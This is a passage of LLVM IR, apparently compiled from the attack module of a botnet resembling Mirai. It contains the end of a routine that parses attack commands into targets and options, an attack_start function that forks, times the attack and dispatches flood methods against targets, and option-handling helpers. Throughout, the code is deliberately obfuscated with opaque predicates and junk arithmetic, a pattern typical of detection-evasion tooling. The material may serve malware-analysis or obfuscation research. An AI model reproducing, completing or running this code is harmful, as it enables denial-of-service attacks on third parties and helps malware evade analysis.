  br i1 %276, label %originalBBpart242, label %originalBB40alteredBB

originalBBpart242:                                ; preds = %originalBB40
  br label %379

; <label>:277:                                    ; preds = %244
  %278 = load i32, i32* @x.7
  %279 = load i32, i32* @y.8
  %280 = sub i32 %278, 1
  %281 = mul i32 %278, %280
  %282 = urem i32 %281, 2
  %283 = icmp eq i32 %282, 0
  %284 = icmp slt i32 %279, 10
  %285 = or i1 %283, %284
  br i1 %285, label %originalBB44, label %originalBB44alteredBB

originalBB44:                                     ; preds = %originalBB44alteredBB, %277
  %286 = load i8*, i8** %11, align 8
  %287 = getelementptr inbounds i8, i8* %286, i32 1
  store i8* %287, i8** %11, align 8
  %288 = load i8, i8* %286, align 1
  store i8 %288, i8* %20, align 1
  %289 = load i32, i32* %12, align 4
  %290 = sext i32 %289 to i64
  %291 = sub i64 %290, 1
  %292 = trunc i64 %291 to i32
  store i32 %292, i32* %12, align 4
  %293 = load i32, i32* %12, align 4
  %294 = load i8, i8* %20, align 1
  %295 = zext i8 %294 to i32
  %296 = icmp slt i32 %293, %295
  %297 = load i32, i32* @x.7
  %298 = load i32, i32* @y.8
  %299 = sub i32 %297, 1
  %300 = mul i32 %297, %299
  %301 = urem i32 %300, 2
  %302 = icmp eq i32 %301, 0
  %303 = icmp slt i32 %298, 10
  %304 = or i1 %302, %303
  br i1 %304, label %originalBBpart250, label %originalBB44alteredBB

originalBBpart250:                                ; preds = %originalBB44
  br i1 %296, label %305, label %306

; <label>:305:                                    ; preds = %originalBBpart250
  br label %379

; <label>:306:                                    ; preds = %originalBBpart250
  %307 = load i32, i32* @x.7
  %308 = load i32, i32* @y.8
  %309 = sub i32 %307, 1
  %310 = mul i32 %307, %309
  %311 = urem i32 %310, 2
  %312 = icmp eq i32 %311, 0
  %313 = icmp slt i32 %308, 10
  %314 = or i1 %312, %313
  br i1 %314, label %originalBB52, label %originalBB52alteredBB

originalBB52:                                     ; preds = %originalBB52alteredBB, %306
  %315 = load i8, i8* %20, align 1
  %316 = zext i8 %315 to i32
  %317 = add nsw i32 %316, 1
  %318 = sext i32 %317 to i64
  %319 = call noalias i8* @calloc(i64 %318, i64 1) #6
  %320 = load %struct.attack_option*, %struct.attack_option** %19, align 8
  %321 = load i32, i32* %13, align 4
  %322 = sext i32 %321 to i64
  %323 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %320, i64 %322
  %324 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %323, i32 0, i32 0
  store i8* %319, i8** %324, align 8
  %325 = load %struct.attack_option*, %struct.attack_option** %19, align 8
  %326 = load i32, i32* %13, align 4
  %327 = sext i32 %326 to i64
  %328 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %325, i64 %327
  %329 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %328, i32 0, i32 0
  %330 = load i8*, i8** %329, align 8
  %331 = load i8*, i8** %11, align 8
  %332 = load i8, i8* %20, align 1
  %333 = zext i8 %332 to i32
  call void @util_memcpy(i8* %330, i8* %331, i32 %333)
  %334 = load i8, i8* %20, align 1
  %335 = zext i8 %334 to i32
  %336 = load i8*, i8** %11, align 8
  %337 = sext i32 %335 to i64
  %338 = getelementptr inbounds i8, i8* %336, i64 %337
  store i8* %338, i8** %11, align 8
  %339 = load i8, i8* %20, align 1
  %340 = zext i8 %339 to i32
  %341 = load i32, i32* %12, align 4
  %342 = sub nsw i32 %341, %340
  store i32 %342, i32* %12, align 4
  %343 = load i32, i32* @x.7
  %344 = load i32, i32* @y.8
  %345 = sub i32 %343, 1
  %346 = mul i32 %343, %345
  %347 = urem i32 %346, 2
  %348 = icmp eq i32 %347, 0
  %349 = icmp slt i32 %344, 10
  %350 = or i1 %348, %349
  br i1 %350, label %originalBBpart280, label %originalBB52alteredBB

originalBBpart280:                                ; preds = %originalBB52
  br label %351

; <label>:351:                                    ; preds = %originalBBpart280
  %352 = load i32, i32* %13, align 4
  %353 = add nsw i32 %352, 1
  store i32 %353, i32* %13, align 4
  br label %234

; <label>:354:                                    ; preds = %234
  %355 = load i32, i32* @x.7
  %356 = load i32, i32* @y.8
  %357 = sub i32 %355, 1
  %358 = mul i32 %355, %357
  %359 = urem i32 %358, 2
  %360 = icmp eq i32 %359, 0
  %361 = icmp slt i32 %356, 10
  %362 = or i1 %360, %361
  br i1 %362, label %originalBB82, label %originalBB82alteredBB

originalBB82:                                     ; preds = %originalBB82alteredBB, %354
  %363 = load i32, i32* @x.7
  %364 = load i32, i32* @y.8
  %365 = sub i32 %363, 1
  %366 = mul i32 %363, %365
  %367 = urem i32 %366, 2
  %368 = icmp eq i32 %367, 0
  %369 = icmp slt i32 %364, 10
  %370 = or i1 %368, %369
  br i1 %370, label %originalBBpart284, label %originalBB82alteredBB

originalBBpart284:                                ; preds = %originalBB82
  br label %371

; <label>:371:                                    ; preds = %originalBBpart284, %202
  %372 = call i32* @__errno_location() #7
  store i32 0, i32* %372, align 4
  %373 = load i32, i32* %14, align 4
  %374 = load i8, i8* %15, align 1
  %375 = load i8, i8* %16, align 1
  %376 = load %struct.attack_target*, %struct.attack_target** %18, align 8
  %377 = load i8, i8* %17, align 1
  %378 = load %struct.attack_option*, %struct.attack_option** %19, align 8
  call void @attack_start(i32 %373, i8 zeroext %374, i8 zeroext %375, %struct.attack_target* %376, i8 zeroext %377, %struct.attack_option* %378)
  br label %379

; <label>:379:                                    ; preds = %371, %305, %originalBBpart242, %243, %201, %125, %originalBBpart28, %73, %62, %originalBBpart24
  %380 = load i32, i32* @x.7
  %381 = load i32, i32* @y.8
  %382 = sub i32 %380, 1
  %383 = mul i32 %380, %382
  %384 = urem i32 %383, 2
  %385 = icmp eq i32 %384, 0
  %386 = icmp slt i32 %381, 10
  %387 = or i1 %385, %386
  br i1 %387, label %originalBB86, label %originalBB86alteredBB

originalBB86:                                     ; preds = %originalBB86alteredBB, %379
  %388 = load %struct.attack_target*, %struct.attack_target** %18, align 8
  %389 = icmp ne %struct.attack_target* %388, null
  %390 = load i32, i32* @x.7
  %391 = load i32, i32* @y.8
  %392 = sub i32 %390, 1
  %393 = mul i32 %390, %392
  %394 = urem i32 %393, 2
  %395 = icmp eq i32 %394, 0
  %396 = icmp slt i32 %391, 10
  %397 = or i1 %395, %396
  br i1 %397, label %originalBBpart288, label %originalBB86alteredBB

originalBBpart288:                                ; preds = %originalBB86
  br i1 %389, label %398, label %401

; <label>:398:                                    ; preds = %originalBBpart288
  %399 = load %struct.attack_target*, %struct.attack_target** %18, align 8
  %400 = bitcast %struct.attack_target* %399 to i8*
  call void @free(i8* %400) #6
  br label %401

; <label>:401:                                    ; preds = %398, %originalBBpart288
  %402 = load %struct.attack_option*, %struct.attack_option** %19, align 8
  %403 = icmp ne %struct.attack_option* %402, null
  br i1 %403, label %404, label %408

; <label>:404:                                    ; preds = %401
  %405 = load %struct.attack_option*, %struct.attack_option** %19, align 8
  %406 = load i8, i8* %17, align 1
  %407 = zext i8 %406 to i32
  call void @free_opts(%struct.attack_option* %405, i32 %407)
  br label %408

; <label>:408:                                    ; preds = %404, %401
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %2
  %409 = alloca i8*, align 8
  %410 = alloca i32, align 4
  %411 = alloca i32, align 4
  %412 = alloca i32, align 4
  %413 = alloca i8, align 1
  %414 = alloca i8, align 1
  %415 = alloca i8, align 1
  %416 = alloca %struct.attack_target*, align 8
  %417 = alloca %struct.attack_option*, align 8
  %418 = alloca i8, align 1
  store i8* %0, i8** %409, align 8
  store i32 %1, i32* %410, align 4
  store %struct.attack_target* null, %struct.attack_target** %416, align 8
  store %struct.attack_option* null, %struct.attack_option** %417, align 8
  %419 = load i32, i32* %410, align 4
  %420 = sext i32 %419 to i64
  %421 = icmp ult i64 %420, 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %32
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %85
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %102
  %422 = load i32, i32* %12, align 4
  %423 = sext i32 %422 to i64
  %424 = load i8, i8* %16, align 1
  %425 = zext i8 %424 to i64
  %_ = shl i64 5, %425
  %_11 = sub i64 0, 5
  %gen = add i64 %_11, %425
  %_12 = sub i64 5, %425
  %gen13 = mul i64 %_12, %425
  %_14 = sub i64 5, %425
  %gen15 = mul i64 %_14, %425
  %_16 = sub i64 0, 5
  %gen17 = add i64 %_16, %425
  %_18 = shl i64 5, %425
  %_19 = sub i64 0, 5
  %gen20 = add i64 %_19, %425
  %426 = mul i64 5, %425
  %427 = icmp ult i64 %423, %426
  br label %originalBB10

originalBB24alteredBB:                            ; preds = %originalBB24, %136
  %428 = load i8*, i8** %11, align 8
  %429 = bitcast i8* %428 to i32*
  %430 = load i32, i32* %429, align 4
  %431 = load %struct.attack_target*, %struct.attack_target** %18, align 8
  %432 = load i32, i32* %13, align 4
  %433 = sext i32 %432 to i64
  %434 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %431, i64 %433
  %435 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %434, i32 0, i32 1
  store i32 %430, i32* %435, align 4
  %436 = load i8*, i8** %11, align 8
  %437 = getelementptr inbounds i8, i8* %436, i64 4
  store i8* %437, i8** %11, align 8
  %438 = load i8*, i8** %11, align 8
  %439 = getelementptr inbounds i8, i8* %438, i32 1
  store i8* %439, i8** %11, align 8
  %440 = load i8, i8* %438, align 1
  %441 = load %struct.attack_target*, %struct.attack_target** %18, align 8
  %442 = load i32, i32* %13, align 4
  %443 = sext i32 %442 to i64
  %444 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %441, i64 %443
  %445 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %444, i32 0, i32 2
  store i8 %440, i8* %445, align 4
  %446 = load i32, i32* %12, align 4
  %447 = sext i32 %446 to i64
  %_25 = sub i64 %447, 5
  %gen26 = mul i64 %_25, 5
  %_27 = shl i64 %447, 5
  %_28 = sub i64 %447, 5
  %gen29 = mul i64 %_28, 5
  %_30 = sub i64 0, %447
  %gen31 = add i64 %_30, 5
  %_32 = shl i64 %447, 5
  %448 = sub i64 %447, 5
  %449 = trunc i64 %448 to i32
  store i32 %449, i32* %12, align 4
  %450 = load %struct.attack_target*, %struct.attack_target** %18, align 8
  %451 = load i32, i32* %13, align 4
  %452 = sext i32 %451 to i64
  %453 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %450, i64 %452
  %454 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %453, i32 0, i32 0
  %455 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %454, i32 0, i32 0
  store i16 2, i16* %455, align 4
  %456 = load %struct.attack_target*, %struct.attack_target** %18, align 8
  %457 = load i32, i32* %13, align 4
  %458 = sext i32 %457 to i64
  %459 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %456, i64 %458
  %460 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %459, i32 0, i32 1
  %461 = load i32, i32* %460, align 4
  %462 = load %struct.attack_target*, %struct.attack_target** %18, align 8
  %463 = load i32, i32* %13, align 4
  %464 = sext i32 %463 to i64
  %465 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %462, i64 %464
  %466 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %465, i32 0, i32 0
  %467 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %466, i32 0, i32 2
  %468 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %467, i32 0, i32 0
  store i32 %461, i32* %468, align 4
  br label %originalBB24

originalBB36alteredBB:                            ; preds = %originalBB36, %213
  %469 = load i8, i8* %17, align 1
  %470 = zext i8 %469 to i64
  %471 = call noalias i8* @calloc(i64 %470, i64 16) #6
  %472 = bitcast i8* %471 to %struct.attack_option*
  store %struct.attack_option* %472, %struct.attack_option** %19, align 8
  store i32 0, i32* %13, align 4
  br label %originalBB36

originalBB40alteredBB:                            ; preds = %originalBB40, %260
  br label %originalBB40

originalBB44alteredBB:                            ; preds = %originalBB44, %277
  %473 = load i8*, i8** %11, align 8
  %474 = getelementptr inbounds i8, i8* %473, i32 1
  store i8* %474, i8** %11, align 8
  %475 = load i8, i8* %473, align 1
  store i8 %475, i8* %20, align 1
  %476 = load i32, i32* %12, align 4
  %477 = sext i32 %476 to i64
  %_45 = sub i64 %477, 1
  %gen46 = mul i64 %_45, 1
  %_47 = sub i64 %477, 1
  %gen48 = mul i64 %_47, 1
  %478 = sub i64 %477, 1
  %479 = trunc i64 %478 to i32
  store i32 %479, i32* %12, align 4
  %480 = load i32, i32* %12, align 4
  %481 = load i8, i8* %20, align 1
  %482 = zext i8 %481 to i32
  %483 = icmp slt i32 %480, %482
  br label %originalBB44

originalBB52alteredBB:                            ; preds = %originalBB52, %306
  %484 = load i8, i8* %20, align 1
  %485 = zext i8 %484 to i32
  %_53 = sub i32 %485, 1
  %gen54 = mul i32 %_53, 1
  %_55 = sub i32 0, %485
  %gen56 = add i32 %_55, 1
  %_57 = sub i32 0, %485
  %gen58 = add i32 %_57, 1
  %_59 = sub i32 %485, 1
  %gen60 = mul i32 %_59, 1
  %_61 = shl i32 %485, 1
  %_62 = sub i32 %485, 1
  %gen63 = mul i32 %_62, 1
  %_64 = shl i32 %485, 1
  %_65 = sub i32 %485, 1
  %gen66 = mul i32 %_65, 1
  %486 = add nsw i32 %485, 1
  %487 = sext i32 %486 to i64
  %488 = call noalias i8* @calloc(i64 %487, i64 1) #6
  %489 = load %struct.attack_option*, %struct.attack_option** %19, align 8
  %490 = load i32, i32* %13, align 4
  %491 = sext i32 %490 to i64
  %492 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %489, i64 %491
  %493 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %492, i32 0, i32 0
  store i8* %488, i8** %493, align 8
  %494 = load %struct.attack_option*, %struct.attack_option** %19, align 8
  %495 = load i32, i32* %13, align 4
  %496 = sext i32 %495 to i64
  %497 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %494, i64 %496
  %498 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %497, i32 0, i32 0
  %499 = load i8*, i8** %498, align 8
  %500 = load i8*, i8** %11, align 8
  %501 = load i8, i8* %20, align 1
  %502 = zext i8 %501 to i32
  call void @util_memcpy(i8* %499, i8* %500, i32 %502)
  %503 = load i8, i8* %20, align 1
  %504 = zext i8 %503 to i32
  %505 = load i8*, i8** %11, align 8
  %506 = sext i32 %504 to i64
  %507 = getelementptr inbounds i8, i8* %505, i64 %506
  store i8* %507, i8** %11, align 8
  %508 = load i8, i8* %20, align 1
  %509 = zext i8 %508 to i32
  %510 = load i32, i32* %12, align 4
  %_67 = sub i32 0, %510
  %gen68 = add i32 %_67, %509
  %_69 = shl i32 %510, %509
  %_70 = sub i32 0, %510
  %gen71 = add i32 %_70, %509
  %_72 = sub i32 0, %510
  %gen73 = add i32 %_72, %509
  %_74 = sub i32 0, %510
  %gen75 = add i32 %_74, %509
  %_76 = shl i32 %510, %509
  %_77 = sub i32 0, %510
  %gen78 = add i32 %_77, %509
  %511 = sub nsw i32 %510, %509
  store i32 %511, i32* %12, align 4
  br label %originalBB52

originalBB82alteredBB:                            ; preds = %originalBB82, %354
  br label %originalBB82

originalBB86alteredBB:                            ; preds = %originalBB86, %379
  %512 = load %struct.attack_target*, %struct.attack_target** %18, align 8
  %513 = icmp ne %struct.attack_target* %512, null
  br label %originalBB86
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #2

declare void @util_memcpy(i8*, i8*, i32) #3

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #2

; Function Attrs: noinline nounwind uwtable
define void @attack_start(i32, i8 zeroext, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_target*, align 8
  %11 = alloca i8, align 1
  %12 = alloca %struct.attack_option*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  store i32 %0, i32* %7, align 4
  store i8 %1, i8* %8, align 1
  store i8 %2, i8* %9, align 1
  store %struct.attack_target* %3, %struct.attack_target** %10, align 8
  store i8 %4, i8* %11, align 1
  store %struct.attack_option* %5, %struct.attack_option** %12, align 8
  %16 = call i32 @fork() #6
  store i32 %16, i32* %13, align 4
  %17 = load i32, i32* %13, align 4
  %18 = icmp eq i32 %17, -1
  br i1 %18, label %22, label %19

; <label>:19:                                     ; preds = %6
  %20 = load i32, i32* %13, align 4
  %21 = icmp sgt i32 %20, 0
  br i1 %21, label %22, label %23

; <label>:22:                                     ; preds = %19, %6
  ret void

; <label>:23:                                     ; preds = %19
  %24 = load i32, i32* @x.9
  %25 = load i32, i32* @y.10
  %26 = sub i32 %24, 1
  %27 = mul i32 %24, %26
  %28 = urem i32 %27, 2
  %29 = icmp eq i32 %28, 0
  %30 = icmp slt i32 %25, 10
  %31 = or i1 %29, %30
  br i1 %31, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %23
  %32 = call i32 @fork() #6
  store i32 %32, i32* %14, align 4
  %33 = load i32, i32* %14, align 4
  %34 = icmp eq i32 %33, -1
  %35 = load i32, i32* @x.9
  %36 = load i32, i32* @y.10
  %37 = sub i32 %35, 1
  %38 = mul i32 %35, %37
  %39 = urem i32 %38, 2
  %40 = icmp eq i32 %39, 0
  %41 = icmp slt i32 %36, 10
  %42 = or i1 %40, %41
  br i1 %42, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %34, label %43, label %44

; <label>:43:                                     ; preds = %originalBBpart2
  call void @exit(i32 0) #8
  unreachable

; <label>:44:                                     ; preds = %originalBBpart2
  %45 = load i32, i32* %14, align 4
  %46 = icmp eq i32 %45, 0
  br i1 %46, label %47, label %52

; <label>:47:                                     ; preds = %44
  %48 = load i32, i32* %7, align 4
  %49 = call i32 @sleep(i32 %48)
  %50 = call i32 @getppid() #6
  %51 = call i32 @kill(i32 %50, i32 9) #6
  call void @exit(i32 0) #8
  unreachable

; <label>:52:                                     ; preds = %44
  store i32 0, i32* %15, align 4
  br label %53

; <label>:53:                                     ; preds = %99, %52
  %54 = load i32, i32* %15, align 4
  %55 = load i8, i8* @methods_len, align 1
  %56 = zext i8 %55 to i32
  %57 = icmp slt i32 %54, %56
  br i1 %57, label %58, label %102

; <label>:58:                                     ; preds = %53
  %59 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %60 = load i32, i32* %15, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %59, i64 %61
  %63 = load %struct.attack_method*, %struct.attack_method** %62, align 8
  %64 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %63, i32 0, i32 1
  %65 = load i8, i8* %64, align 8
  %66 = zext i8 %65 to i32
  %67 = load i8, i8* %8, align 1
  %68 = zext i8 %67 to i32
  %69 = icmp eq i32 %66, %68
  br i1 %69, label %70, label %82

; <label>:70:                                     ; preds = %58
  %71 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %72 = load i32, i32* %15, align 4
  %73 = sext i32 %72 to i64
  %74 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %71, i64 %73
  %75 = load %struct.attack_method*, %struct.attack_method** %74, align 8
  %76 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %75, i32 0, i32 0
  %77 = load void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %76, align 8
  %78 = load i8, i8* %9, align 1
  %79 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %80 = load i8, i8* %11, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %12, align 8
  call void %77(i8 zeroext %78, %struct.attack_target* %79, i8 zeroext %80, %struct.attack_option* %81)
  br label %102

; <label>:82:                                     ; preds = %58
  %83 = load i32, i32* @x.9
  %84 = load i32, i32* @y.10
  %85 = sub i32 %83, 1
  %86 = mul i32 %83, %85
  %87 = urem i32 %86, 2
  %88 = icmp eq i32 %87, 0
  %89 = icmp slt i32 %84, 10
  %90 = or i1 %88, %89
  br i1 %90, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %82
  %91 = load i32, i32* @x.9
  %92 = load i32, i32* @y.10
  %93 = sub i32 %91, 1
  %94 = mul i32 %91, %93
  %95 = urem i32 %94, 2
  %96 = icmp eq i32 %95, 0
  %97 = icmp slt i32 %92, 10
  %98 = or i1 %96, %97
  br i1 %98, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %99

; <label>:99:                                     ; preds = %originalBBpart24
  %100 = load i32, i32* %15, align 4
  %101 = add nsw i32 %100, 1
  store i32 %101, i32* %15, align 4
  br label %53

; <label>:102:                                    ; preds = %70, %53
  call void @exit(i32 0) #8
  unreachable

originalBBalteredBB:                              ; preds = %originalBB, %23
  %103 = call i32 @fork() #6
  store i32 %103, i32* %14, align 4
  %104 = load i32, i32* %14, align 4
  %105 = icmp eq i32 %104, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %82
  br label %originalBB1
}

; Function Attrs: nounwind
declare void @free(i8*) #1

; Function Attrs: noinline nounwind uwtable
define internal void @free_opts(%struct.attack_option*, i32) #0 {
  %3 = alloca %struct.attack_option*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store %struct.attack_option* %0, %struct.attack_option** %3, align 8
  store i32 %1, i32* %4, align 4
  %6 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %7 = icmp eq %struct.attack_option* %6, null
  br i1 %7, label %8, label %9

; <label>:8:                                      ; preds = %2
  br label %68

; <label>:9:                                      ; preds = %2
  store i32 0, i32* %5, align 4
  br label %10

; <label>:10:                                     ; preds = %62, %9
  %11 = load i32, i32* @x.11
  %12 = load i32, i32* @y.12
  %13 = sub i32 %11, 1
  %14 = mul i32 %11, %13
  %15 = urem i32 %14, 2
  %16 = icmp eq i32 %15, 0
  %17 = icmp slt i32 %12, 10
  %18 = or i1 %16, %17
  br i1 %18, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %10
  %19 = load i32, i32* %5, align 4
  %20 = load i32, i32* %4, align 4
  %21 = icmp slt i32 %19, %20
  %22 = load i32, i32* @x.11
  %23 = load i32, i32* @y.12
  %24 = sub i32 %22, 1
  %25 = mul i32 %22, %24
  %26 = urem i32 %25, 2
  %27 = icmp eq i32 %26, 0
  %28 = icmp slt i32 %23, 10
  %29 = or i1 %27, %28
  br i1 %29, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %21, label %30, label %65

; <label>:30:                                     ; preds = %originalBBpart2
  %31 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %32 = load i32, i32* %5, align 4
  %33 = sext i32 %32 to i64
  %34 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %31, i64 %33
  %35 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %34, i32 0, i32 0
  %36 = load i8*, i8** %35, align 8
  %37 = icmp ne i8* %36, null
  br i1 %37, label %38, label %61

; <label>:38:                                     ; preds = %30
  %39 = load i32, i32* @x.11
  %40 = load i32, i32* @y.12
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %38
  %47 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %48 = load i32, i32* %5, align 4
  %49 = sext i32 %48 to i64
  %50 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %47, i64 %49
  %51 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %50, i32 0, i32 0
  %52 = load i8*, i8** %51, align 8
  call void @free(i8* %52) #6
  %53 = load i32, i32* @x.11
  %54 = load i32, i32* @y.12
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %61

; <label>:61:                                     ; preds = %originalBBpart24, %30
  br label %62

; <label>:62:                                     ; preds = %61
  %63 = load i32, i32* %5, align 4
  %64 = add nsw i32 %63, 1
  store i32 %64, i32* %5, align 4
  br label %10

; <label>:65:                                     ; preds = %originalBBpart2
  %66 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %67 = bitcast %struct.attack_option* %66 to i8*
  call void @free(i8* %67) #6
  br label %68

; <label>:68:                                     ; preds = %65, %8
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %10
  %69 = load i32, i32* %5, align 4
  %70 = load i32, i32* %4, align 4
  %71 = icmp slt i32 %69, %70
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %38
  %72 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %73 = load i32, i32* %5, align 4
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %72, i64 %74
  %76 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %75, i32 0, i32 0
  %77 = load i8*, i8** %76, align 8
  call void @free(i8* %77) #6
  br label %originalBB1
}

; Function Attrs: nounwind
declare i32 @fork() #1

; Function Attrs: noreturn nounwind
declare void @exit(i32) #4

declare i32 @sleep(i32) #3

; Function Attrs: nounwind
declare i32 @getppid() #1

; Function Attrs: noinline nounwind uwtable
define i8* @attack_get_opt_str(i8 zeroext, %struct.attack_option*, i8 zeroext, i8*) #0 {
  %5 = load i32, i32* @x.13
  %6 = load i32, i32* @y.14
  %7 = sub i32 %5, 1
  %8 = mul i32 %5, %7
  %9 = urem i32 %8, 2
  %10 = icmp eq i32 %9, 0
  %11 = icmp slt i32 %6, 10
  %12 = or i1 %10, %11
  br i1 %12, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %4
  %13 = alloca i8*, align 8
  %14 = alloca i8, align 1
  %15 = alloca %struct.attack_option*, align 8
  %16 = alloca i8, align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  store i8 %0, i8* %14, align 1
  store %struct.attack_option* %1, %struct.attack_option** %15, align 8
  store i8 %2, i8* %16, align 1
  store i8* %3, i8** %17, align 8
  store i32 0, i32* %18, align 4
  %19 = load i32, i32* @x.13
  %20 = load i32, i32* @y.14
  %21 = sub i32 %19, 1
  %22 = mul i32 %19, %21
  %23 = urem i32 %22, 2
  %24 = icmp eq i32 %23, 0
  %25 = icmp slt i32 %20, 10
  %26 = or i1 %24, %25
  br i1 %26, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %27

; <label>:27:                                     ; preds = %originalBBpart28, %originalBBpart2
  %28 = load i32, i32* %18, align 4
  %29 = load i8, i8* %14, align 1
  %30 = zext i8 %29 to i32
  %31 = icmp slt i32 %28, %30
  br i1 %31, label %32, label %86

; <label>:32:                                     ; preds = %27
  %33 = load i32, i32* @x.13
  %34 = load i32, i32* @y.14
  %35 = sub i32 %33, 1
  %36 = mul i32 %33, %35
  %37 = urem i32 %36, 2
  %38 = icmp eq i32 %37, 0
  %39 = icmp slt i32 %34, 10
  %40 = or i1 %38, %39
  br i1 %40, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %32
  %41 = load %struct.attack_option*, %struct.attack_option** %15, align 8
  %42 = load i32, i32* %18, align 4
  %43 = sext i32 %42 to i64
  %44 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %41, i64 %43
  %45 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %44, i32 0, i32 1
  %46 = load i8, i8* %45, align 8
  %47 = zext i8 %46 to i32
  %48 = load i8, i8* %16, align 1
  %49 = zext i8 %48 to i32
  %50 = icmp eq i32 %47, %49
  %51 = load i32, i32* @x.13
  %52 = load i32, i32* @y.14
  %53 = sub i32 %51, 1
  %54 = mul i32 %51, %53
  %55 = urem i32 %54, 2
  %56 = icmp eq i32 %55, 0
  %57 = icmp slt i32 %52, 10
  %58 = or i1 %56, %57
  br i1 %58, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %50, label %59, label %66

; <label>:59:                                     ; preds = %originalBBpart24
  %60 = load %struct.attack_option*, %struct.attack_option** %15, align 8
  %61 = load i32, i32* %18, align 4
  %62 = sext i32 %61 to i64
  %63 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %60, i64 %62
  %64 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %63, i32 0, i32 0
  %65 = load i8*, i8** %64, align 8
  store i8* %65, i8** %13, align 8
  br label %88

; <label>:66:                                     ; preds = %originalBBpart24
  br label %67

; <label>:67:                                     ; preds = %66
  %68 = load i32, i32* @x.13
  %69 = load i32, i32* @y.14
  %70 = sub i32 %68, 1
  %71 = mul i32 %68, %70
  %72 = urem i32 %71, 2
  %73 = icmp eq i32 %72, 0
  %74 = icmp slt i32 %69, 10
  %75 = or i1 %73, %74
  br i1 %75, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %67
  %76 = load i32, i32* %18, align 4
  %77 = add nsw i32 %76, 1
  store i32 %77, i32* %18, align 4
  %78 = load i32, i32* @x.13
  %79 = load i32, i32* @y.14
  %80 = sub i32 %78, 1
